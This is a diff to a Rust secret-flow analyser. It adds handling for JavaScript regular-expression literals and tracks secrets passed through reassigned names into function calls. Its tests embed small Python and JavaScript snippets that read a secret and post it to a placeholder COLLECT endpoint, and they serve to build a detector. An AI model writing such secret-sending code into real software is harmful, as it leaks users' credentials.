@@ -934,10 +934,59 @@ fn blank(text: &str, lang: Lang, strings: bool) -> String {
             i = end;
             continue;
         }
+        if let Some(end) = regex_literal_end(b, i, lang) {
+            // The slashes stay; the pattern is text, like a string's.
+            out.push(b'/');
+            if strings {
+                out.extend(std::iter::repeat_n(b' ', end - i - 2));
+            } else {
+                out.extend_from_slice(&b[i + 1..end - 1]);
+            }
+            out.push(b'/');
+            i = end;
+            continue;
+        }
         out.push(b[i]);
         i += 1;
     }
     String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
+}
+
+/// Where the JavaScript regular-expression literal starting at `i` ends
+/// (after its closing `/`), if one starts there: a `/` where a value is
+/// expected (at the start of a line, or after `(`, `,`, `=`, `:`, `[`, `!`,
+/// `&`, `|`, `?`, `{`, `}`, `;` or an arithmetic operator), closed on the same
+/// line by a `/` outside a `[...]` class and not escaped. After a name, a
+/// number or `)` a `/` divides. Without this, a quote inside a pattern
+/// (`/"/g`) would open a string running to the end of the line.
+fn regex_literal_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
+    const MAX_REGEX: usize = 256;
+    if lang != Lang::CLike || b[i] != b'/' || matches!(b.get(i + 1), Some(b'/' | b'*')) {
+        return None;
+    }
+    let mut k = i;
+    while k > 0 && (b[k - 1] == b' ' || b[k - 1] == b'\t') {
+        k -= 1;
+    }
+    if k > 0 && !b"\n(,=:[!&|?{};+-*%<>~^".contains(&b[k - 1]) {
+        return None;
+    }
+    let mut j = i + 1;
+    let mut class = false;
+    // A longer pattern is left alone: stopping here keeps a line of `/`s
+    // that never close (`(/[(/[...`) linear.
+    while j < b.len() && b[j] != b'\n' && j - i <= MAX_REGEX {
+        match b[j] {
+            b'\\' if b.get(j + 1) == Some(&b'\n') => return None,
+            b'\\' => j += 1,
+            b'[' => class = true,
+            b']' => class = false,
+            b'/' if !class => return (j > i + 1).then_some(j + 1),
+            _ => {}
+        }
+        j += 1;
+    }
+    None
 }
 
 /// Where the comment starting at `i` ends, if one starts there.
@@ -1864,13 +1913,16 @@ fn in_body(code: &CodeLines, h: usize, header: &Header, line: usize) -> bool {
     opened && depth > 0 || (!opened && line == h + 1)
 }
 
-/// Is the function called `name` called with `bound` as a value on one of
-/// `lines`, other than `skip` (its header)? Then its parameter receives the
-/// bound value, and a use of the parameter is a use of that value.
+/// Is the function called `name` called with `bound`, or a name assigned
+/// from it since `source_line` (`t = token`, then `send(t)`), as a value on
+/// one of `lines`, other than `skip` (its header)? Then its parameter
+/// receives the bound value, and a use of the parameter is a use of that
+/// value.
 fn called_with(
     code: &CodeLines,
     name: &str,
     bound: &str,
+    source_line: usize,
     lines: std::ops::RangeInclusive<usize>,
     skip: usize,
 ) -> bool {
@@ -1880,7 +1932,10 @@ fn called_with(
             let c = code.code(n);
             c.len() <= MAX_HOP_LINE
                 && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
-                && uses_value(c, bound, code.lang, None)
+                && (uses_value(c, bound, code.lang, None)
+                    || derived_names(code, source_line, n, &[bound])
+                        .iter()
+                        .any(|d| uses_value(c, d, code.lang, None)))
         })
 }
 
@@ -1918,7 +1973,14 @@ fn shadowed_from(
                 continue;
             };
             if header.name.is_some_and(|f| {
-                called_with(code, f, bound, source_line + 1..=source_line + window, h)
+                called_with(
+                    code,
+                    f,
+                    bound,
+                    source_line,
+                    source_line + 1..=source_line + window,
+                    h,
+                )
             }) {
                 continue;
             }
@@ -3341,6 +3403,12 @@ mod tests {
         // the function: these link.
         let called = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(token)\n";
         assert!(value_links("app.py", called, 1, 4));
+        // Called with the secret under a name assigned from it.
+        let forwarded = "token = read_secret()\nt = token\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(t)\n";
+        assert!(value_links("app.py", forwarded, 1, 5));
+        // Called with something else, the parameter is something else.
+        let other = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(\"public\")\n";
+        assert!(!value_links("app.py", other, 1, 4));
         let ended = "token = read_secret()\n\ndef strip(token):\n    return token.strip()\n\nrequests.post(COLLECT, data=token)\n";
         assert!(value_links("app.py", ended, 1, 6));
         let before = "token = read_secret()\nrequests.post(COLLECT, data=token, hooks={\"response\": lambda token, *a, **k: None})\n";
@@ -3719,6 +3787,34 @@ mod tests {
         );
         assert_eq!(without_comments("a=$(b) # c", Lang::Hash), "a=$(b)    ");
         assert_eq!(without_comments("a#b", Lang::Hash), "a#b");
+        // A regular-expression literal is text; a quote inside it opens no
+        // string. After a name or `)`, `/` divides.
+        assert_eq!(
+            code_only("s.replace(/\"/g, token)", Lang::CLike),
+            "s.replace(/ /g, token)"
+        );
+        assert_eq!(
+            code_only("const re = /token=([^/&]+)/;", Lang::CLike),
+            "const re = /              /;"
+        );
+        assert_eq!(code_only("x = a / b / c", Lang::CLike), "x = a / b / c");
+        assert_eq!(
+            code_only("x = (a) / 2 / token", Lang::CLike),
+            "x = (a) / 2 / token"
+        );
+        assert_eq!(
+            without_comments("s.replace(/\"/g, t)", Lang::CLike),
+            "s.replace(/\"/g, t)"
+        );
+        assert!(uses_value(
+            &code_only(
+                "fetch(u, { body: s.replace(/'/g, \"\") + token })",
+                Lang::CLike
+            ),
+            "token",
+            Lang::CLike,
+            None
+        ));
         for (text, lang) in [
             ("s = f\"{a!r:>{w}}\" + '\\'' # x", Lang::Python),
             ("const s = `a${b}` /* c */ + 'd';", Lang::CLike),
@@ -3733,8 +3829,10 @@ mod tests {
     /// name in shapes it has to look at: keys after `(` in Python (which ask
     /// for the open bracket), a destructuring target, attributes of another
     /// object. Each took quadratic time while every occurrence re-read the
-    /// line. The limits allow for a debug build and a loaded machine; the
-    /// quadratic reading needed minutes at this size.
+    /// line. So would a line of regular-expression openings that never close,
+    /// without the cap on how far one is read. The limits allow for a debug
+    /// build and a loaded machine; the quadratic reading needed minutes at
+    /// this size.
     #[test]
     fn long_lines_stay_linear() {
         let n = 100_000;
@@ -3762,6 +3860,11 @@ mod tests {
                     "requests.post(COLLECT, data=[{}])",
                     "len(token), ".repeat(n)
                 ),
+            ),
+            // `/` openings of patterns that never close.
+            (
+                "a.js",
+                format!("fetch(COLLECT, {{ q: [{}] }});", "(/[".repeat(n)),
             ),
         ] {
             let src = format!("token = read_secret()\n{line}\n");
